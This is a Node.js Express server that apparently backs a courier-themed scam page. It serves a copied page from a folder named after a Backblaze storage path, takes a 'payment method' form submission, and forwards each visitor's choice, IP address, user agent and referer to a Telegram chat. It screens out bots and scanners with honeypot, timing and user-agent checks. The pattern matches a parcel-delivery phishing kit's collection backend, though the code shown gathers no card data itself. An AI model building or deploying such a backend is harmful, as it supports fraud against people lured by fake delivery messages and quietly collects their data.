const express = require('express');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');

const app = express();
const PORT = process.env.PORT || 3000;

// Security middleware
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'", "'unsafe-inline'", "https://cdn.tailwindcss.com"],
            styleSrc: ["'self'", "'unsafe-inline'"],
            imgSrc: ["'self'", "data:", "https:"],
            connectSrc: ["'self'"],
            fontSrc: ["'self'"],
            objectSrc: ["'none'"],
            mediaSrc: ["'self'"],
            frameSrc: ["'none'"],
        },
    },
    crossOriginEmbedderPolicy: false,
}));

// Rate limiting for form submissions
const submitLimiter = rateLimit({
    windowMs: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 15 * 60 * 1000, // 15 minutes
    max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 5, // limit each IP to 5 requests per windowMs
    message: 'Too many form submissions from this IP, please try again later.',
    standardHeaders: true,
    legacyHeaders: false,
});

// Body parser middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Initialize Telegram Bot (only if credentials are provided)
let bot = null;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
    bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
    console.log('Telegram bot initialized');
} else {
    console.warn('Telegram credentials not configured. Form submissions will be logged but not sent to Telegram.');
}

// Serve static files from the root directory (excluding sensitive files)
app.use(express.static(__dirname, {
    dotfiles: 'deny',
    index: false
}));

// Helper function to validate submission
function validateSubmission(req) {
    const errors = [];
    
    // Check honeypot field (should be empty)
    // Using a less obvious field name that bots might not recognize
    if (req.body.company_url && req.body.company_url.trim() !== '') {
        errors.push('Bot detected: honeypot field filled');
    }
    
    // Check User-Agent
    const userAgent = req.headers['user-agent'];
    if (!userAgent || userAgent.length < 10) {
        errors.push('Invalid or missing User-Agent');
    }
    
    // Check for required field
    if (!req.body.vehicle1) {
        errors.push('Payment method not selected');
    }
    
    // Basic timing check (form should take at least 2 seconds to fill)
    const formLoadTime = req.body.form_load_time;
    const currentTime = Date.now();
    if (formLoadTime && (currentTime - parseInt(formLoadTime)) < 2000) {
        errors.push('Form submitted too quickly');
    }
    
    return errors;
}

// Form submission endpoint
app.post('/api/submit', submitLimiter, async (req, res) => {
    try {
        // Validate submission
        const validationErrors = validateSubmission(req);
        
        if (validationErrors.length > 0) {
            console.log('Validation failed:', validationErrors);
            return res.status(400).json({ 
                success: false, 
                message: 'Invalid submission',
                errors: validationErrors 
            });
        }
        
        // Extract form data
        const formData = {
            paymentMethod: req.body.vehicle1 || 'Not specified',
            ipAddress: req.ip || req.connection.remoteAddress,
            userAgent: req.headers['user-agent'],
            timestamp: new Date().toISOString(),
            referer: req.headers['referer'] || 'Direct',
        };
        
        // Log submission
        console.log('Form submission received:', formData);
        
        // Send to Telegram if configured
        if (bot && TELEGRAM_CHAT_ID) {
            const message = `🚚 *New Courier Form Submission*\n\n` +
                `💳 *Payment Method:* ${formData.paymentMethod}\n` +
                `📅 *Timestamp:* ${formData.timestamp}\n` +
                `🌐 *IP Address:* ${formData.ipAddress}\n` +
                `📱 *User Agent:* ${formData.userAgent}\n` +
                `🔗 *Referer:* ${formData.referer}`;
            
            await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
            console.log('Notification sent to Telegram');
        }
        
        // Send success response
        res.json({ 
            success: true, 
            message: 'Form submitted successfully',
            redirect: '/success.html'
        });
        
    } catch (error) {
        console.error('Error processing form submission:', error);
        res.status(500).json({ 
            success: false, 
            message: 'An error occurred processing your submission. Please try again later.' 
        });
    }
});

// Health check endpoint for Railway
app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Rate limiting for main page access
const pageAccessLimiter = rateLimit({
    windowMs: 60 * 1000, // 1 minute
    max: 100, // limit each IP to 100 requests per windowMs
    message: 'Too many requests from this IP, please try again later.',
    standardHeaders: true,
    legacyHeaders: false,
});

// Serve main page
app.get('/', pageAccessLimiter, (req, res) => {
    res.sendFile(path.join(__dirname, 'f006.backblazeb2.com', 'file', 'dwiupo', 'index.html'));
});

// Start server
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
    console.log(`Environment: ${process.env.NODE_ENV || 'development'}`);
    console.log(`Telegram bot: ${bot ? 'Enabled' : 'Disabled'}`);
});
